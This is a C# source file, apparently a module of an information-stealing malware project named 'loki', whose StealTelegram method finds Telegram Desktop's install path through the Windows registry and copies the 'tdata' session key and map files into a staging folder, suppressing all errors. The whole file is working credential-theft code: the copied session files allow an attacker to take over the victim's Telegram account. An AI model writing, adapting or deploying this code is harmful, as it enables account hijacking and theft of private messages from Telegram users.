using System;
using System.IO;
using System.Linq;
using Microsoft.Win32;

namespace loki.loki.Utilies.App;

internal class Telegram
{
	public static void StealTelegram(string dir)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Classes\\tdesktop.tg\\DefaultIcon");
			string text = (string)registryKey.GetValue(null);
			registryKey.Close();
			text = text.Remove(text.LastIndexOf('\\') + 1);
			string text2 = text.Replace('"', ' ') + "tdata";
			Directory.CreateDirectory(dir + "\\Telegram");
			string text3 = Path.Combine(dir, "Telegram");
			string[] files = Directory.GetFiles(text2);
			string[] array = files;
			foreach (string text4 in array)
			{
				string text5 = text4.Split(new char[1] { '\\' }).Last();
				if (!text5.Length.Equals(17))
				{
					continue;
				}
				string path = text5.Substring(0, 16);
				if (!Directory.Exists(Path.Combine(text2, path)))
				{
					continue;
				}
				Directory.CreateDirectory(text3);
				File.Copy(text4, Path.Combine(text3, text5));
				Directory.CreateDirectory(Path.Combine(text3, path));
				string[] files2 = Directory.GetFiles(Path.Combine(text2, path));
				string[] array2 = files2;
				foreach (string text6 in array2)
				{
					if (text6.Split(new char[1] { '\\' }).Last().Contains("map"))
					{
						File.Copy(text6, Path.Combine(text3, path, text6.Split(new char[1] { '\\' }).Last()));
					}
				}
			}
		}
		catch (Exception)
		{
		}
	}
}
